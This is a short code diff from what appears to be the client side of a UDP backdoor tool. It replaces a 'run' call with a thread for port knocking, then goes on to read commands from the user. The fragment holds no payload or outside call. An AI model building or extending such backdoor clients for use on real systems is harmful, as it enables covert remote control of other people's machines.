@@ -59,9 +59,10 @@ def main():
             client = backdoor.UdpBackdoorClient(key, pw, args.lport, args.dport, args.server)
             print("starting the UDP Client")
 
-        client.run()
         client.connect()
 
+        #create thread for port knock
+        client.client_thread() 
 
         # read commands from the user until they exit
         while True:
